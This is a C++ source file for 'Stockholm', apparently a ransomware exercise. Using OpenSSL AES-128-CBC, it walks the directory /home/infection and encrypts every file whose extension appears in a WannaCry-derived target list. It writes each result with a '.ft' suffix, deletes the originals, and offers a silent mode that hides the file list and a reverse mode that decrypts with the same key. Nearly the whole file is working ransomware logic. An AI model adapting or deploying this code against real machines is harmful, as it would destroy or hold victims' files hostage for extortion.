#include <iostream>
#include <fstream>
#include <vector>
#include <cstring>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <filesystem>
#include <algorithm>

void encrypt_file(const std::string& inputFile, const std::string& outputFile, const std::string& key) {

    std::ifstream in(inputFile, std::ios::binary);
    std::vector<unsigned char> inData((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
    in.close();

    std::vector<unsigned char> outData(inData.size() + EVP_MAX_BLOCK_LENGTH);

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (ctx == nullptr) 
        throw std::runtime_error("Failed to create cipher context.");

    unsigned char iv[EVP_MAX_IV_LENGTH];
    if (!RAND_bytes(iv, EVP_MAX_IV_LENGTH)) {
        EVP_CIPHER_CTX_free(ctx);
        throw std::runtime_error("Failed to generate IV.");
    }

    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), nullptr, (unsigned char*)key.c_str(), iv)) {
        EVP_CIPHER_CTX_free(ctx);
        throw std::runtime_error("Failed to initialize encryption.");
    }

    int outLen;
    if (1 != EVP_EncryptUpdate(ctx, outData.data(), &outLen, inData.data(), inData.size())) {
        EVP_CIPHER_CTX_free(ctx);
        throw std::runtime_error("Encryption failed.");
    }

    int finalLen;
    if (1 != EVP_EncryptFinal_ex(ctx, outData.data() + outLen, &finalLen)) {
        EVP_CIPHER_CTX_free(ctx);
        throw std::runtime_error("Encryption finalization failed.");
    }

    outData.resize(outLen + finalLen);

    std::ofstream out(outputFile, std::ios::binary);
    out.write(reinterpret_cast<char*>(iv), EVP_MAX_IV_LENGTH); // Écrire IV au début du fichier
    out.write(reinterpret_cast<char*>(outData.data()), outData.size());
    out.close();

    EVP_CIPHER_CTX_free(ctx);
}

void decrypt_file(const std::string& inputFile, const std::string& outputFile, const std::string& key) {

    std::ifstream in(inputFile, std::ios::binary);
    std::vector<unsigned char> inData((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
    in.close();

    unsigned char iv[EVP_MAX_IV_LENGTH];
    std::memcpy(iv, inData.data(), EVP_MAX_IV_LENGTH);

    std::vector<unsigned char> outData(inData.size());

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (ctx == nullptr) 
        throw std::runtime_error("Failed to create cipher context.");

    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), nullptr, (unsigned char*)key.c_str(), iv)) {
        EVP_CIPHER_CTX_free(ctx);
        throw std::runtime_error("Failed to initialize decryption.");
    }

    int outLen;
    if (1 != EVP_DecryptUpdate(ctx, outData.data(), &outLen, inData.data() + EVP_MAX_IV_LENGTH, inData.size() - EVP_MAX_IV_LENGTH)) {
        EVP_CIPHER_CTX_free(ctx);
        throw std::runtime_error("Decryption failed.");
    }

    int finalLen;
    if (1 != EVP_DecryptFinal_ex(ctx, outData.data() + outLen, &finalLen)) {
        EVP_CIPHER_CTX_free(ctx);
        throw std::runtime_error("Decryption finalization failed.");
    }

    outData.resize(outLen + finalLen);

    std::ofstream out(outputFile, std::ios::binary);
    out.write(reinterpret_cast<char*>(outData.data()), outData.size());
    out.close();

    EVP_CIPHER_CTX_free(ctx);
    std::cout << "Decrypted " << inputFile << " to " << outputFile << std::endl;
}

void    handle_options(int argc, char *argv[]) {
    bool silent = false;
    if (strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "-help") == 0) {
        std::cout << "Usage: ./stockholm [key | -option (key)]" << std::endl;
        std::cout << "Encrypts files using a 16-chararacters-long key.\n" << std::endl;
        std::cout << "Options:" << std::endl;
        std::cout << "  -h, -help       Display this information." << std::endl;
        std::cout << "  -v, -version    Display Stockholm's current version." << std::endl;
        std::cout << "  -r [key], -reverse [key]    Reverse the encryption using the key." << std::endl;
        std::cout << "  -s [key], -silent [key]     Do not list encrypted files in output." << std::endl;
    }
    else if (strcmp(argv[1], "-v") == 0 || strcmp(argv[1], "-version") == 0) {
        std::cout << "Stockholm v0.1 (alpha)." << std::endl;
    }
    else if (strcmp(argv[1], "-r") == 0 || strcmp(argv[1], "-reverse") == 0) {
        if (argc != 3)
            throw std::invalid_argument("Usage: ./stockholm -r <key>");
        if (strlen(argv[2]) != 16)
            throw std::invalid_argument("Key must be 16 characters long.");

        std::filesystem::recursive_directory_iterator it("/home/infection");
        std::filesystem::recursive_directory_iterator end;
        while (it != end) {
            if (std::filesystem::is_regular_file(*it) && it->path().extension() == ".ft") {
                std::string inputFile = it->path().string();
                std::string outputFile = inputFile.substr(0, inputFile.size() - 3);
                decrypt_file(inputFile, outputFile, argv[2]);
                std::filesystem::remove(it->path());
            }
            ++it;
        }
    }
    else {
        std::string key;
        if (strcmp(argv[1], "-s") == 0 || strcmp(argv[1], "-silent") == 0) {
            if (argc != 3)
                throw std::invalid_argument("Usage: ./stockholm -s <key>");
            silent = true;
            key = argv[2];
        }
        else {
            key = argv[1];
            std::cout << "Encrypting..."<< std::endl;
        }
            
        if (key.length() != 16)
            throw std::invalid_argument("Key must be 16 characters long.");

        std::vector<std::string> target_extensions;
        std::ifstream extensions("wannacry_extensions.txt");
        if (!extensions)
            throw std::runtime_error("Could not open file with target extensions list.");
        std::string ext;
        while (std::getline(extensions, ext)) {
            ext.erase(ext.find_last_not_of(" \n\r\t") + 1);
            target_extensions.push_back(ext);
        }

        std::filesystem::recursive_directory_iterator it("/home/infection");
        std::filesystem::recursive_directory_iterator end;
        while (it != end) {
            if (std::filesystem::is_regular_file(*it)) {
                std::string inputFile = it->path().string();
                std::filesystem::path filePath(inputFile);
                std::string fileExtension = filePath.extension().string(); 

                if (std::find(target_extensions.begin(), target_extensions.end(), fileExtension) != target_extensions.end() && fileExtension != ".ft") {
                    std::string outputFile = it->path().string() + ".ft";
                    encrypt_file(inputFile, outputFile, key);
                    std::filesystem::remove(it->path());
                    if (!silent)
                        std::cout << "Encrypted " << inputFile << " to " << outputFile << std::endl;
                }
            }
            ++it;
        }
    }
}

int main(int argc, char *argv[]) {
    try
    {
        if (argc > 1)
            handle_options(argc, argv);
        else 
            throw std::invalid_argument("Usage: ./stockholm [key | -option (key)]");
    }
    catch(const std::exception& e)
    {
        std::cerr << "Error: " << e.what() << '\n';
    }
    
}